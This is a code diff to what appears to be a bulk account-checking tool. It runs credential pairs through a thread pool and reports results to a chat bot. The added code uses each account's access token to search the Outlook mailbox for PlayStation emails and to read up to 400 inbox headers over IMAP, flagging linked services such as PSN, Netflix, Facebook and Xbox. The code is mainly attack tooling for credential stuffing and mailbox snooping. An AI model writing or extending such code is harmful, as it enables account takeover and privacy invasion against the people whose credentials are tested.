@@ -457,6 +457,71 @@ class UnifiedChecker:
             out["Netflix"] = True
         if fb.get("facebook_status") == "LINKED":
             out["Facebook"] = True
+        # Optional PSN detection via Outlook search
+        try:
+            url = "https://outlook.live.com/search/api/v2/query"
+            h = {
+                'User-Agent': 'Outlook-Android/2.0',
+                'Authorization': f'Bearer {at}',
+                'X-AnchorMailbox': f'CID:{cid}',
+                'Content-Type': 'application/json'
+            }
+            q = "sony@txn-email.playstation.com OR sony@txn-email01.playstation.com OR sony@txn-email02.playstation.com OR sony@txn-email03.playstation.com"
+            payload = {
+                "Cvid": str(uuid.uuid4()),
+                "Scenario": {"Name": "owa.react"},
+                "TimeZone": "UTC",
+                "TextDecorations": "Off",
+                "EntityRequests": [{
+                    "EntityType": "Conversation",
+                    "ContentSources": ["Exchange"],
+                    "Filter": {"Or": [
+                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
+                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
+                        {"Term": {"DistinguishedFolderName": "Inbox"}}
+                    ]},
+                    "From": 0,
+                    "Query": {"QueryString": q},
+                    "Size": 50,
+                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
+                }]
+            }
+            r = self.session.post(url, json=payload, headers=h, timeout=10)
+            if r.status_code == 200:
+                data = r.json()
+                total = 0
+                for es in data.get('EntitySets', []):
+                    for rs in es.get('ResultSets', []):
+                        total = rs.get('Total', 0)
+                        break
+                if total > 0:
+                    out["PSN"] = True
+        except:
+            pass
+        # Generic IMAP header scan for mapped services and optional custom domain
+        try:
+            mail, err = self._imap_xoauth2_connect(email_addr, at, 'imap-mail.outlook.com', 993)
+            if mail:
+                try:
+                    mail.select('INBOX', readonly=True)
+                    typ, data = mail.search(None, 'ALL')
+                    ids = data[0].split() if data and data[0] else []
+                    ids = list(reversed(ids[-400:] if len(ids) > 400 else ids))
+                    for mid in ids:
+                        t, md = mail.fetch(mid, '(BODY.PEEK[HEADER])')
+                        if t != 'OK' or not md:
+                            continue
+                        raw = md[0][1] if isinstance(md[0], tuple) else b''
+                        msg = email.message_from_bytes(raw)
+                        frm = (msg.get('From') or '').lower()
+                        for dom, name in (self.services_map or {}).items():
+                            if dom in frm:
+                                out[name] = True
+                finally:
+                    try: mail.logout()
+                    except: pass
+        except:
+            pass
         return out, nf, fb
 
     def check(self, email, password):
@@ -514,7 +579,8 @@ def format_result(res):
     password = res.get("password", "")
     country = (res.get("country") or "??").strip().upper()
     xbox = res.get("xbox", {}) or {}
-    xbox_text = xbox.get("details") or xbox.get("status") or "N/A"
+    xdet = xbox.get("details") or xbox.get("status") or ""
+    xbox_text = f"Xbox: {xdet if xdet else 'not FOUND'}"
     balance_text = build_balance_text(res.get("ms_data", {}))
     hyp_parts = []
     if res.get("hypixel_status") == "FOUND":
@@ -686,7 +752,7 @@ class BotApp:
                 # periodic status
                 if sess.checked % 20 == 0:
                     self._send_status(sess, chat_id)
-        ex = ThreadPoolExecutor(max_workers=50)
+        ex = ThreadPoolExecutor(max_workers=20)
         fs = [ex.submit(worker, acc) for acc in accounts]
         for f in fs:
             if sess.stop_ev.is_set():
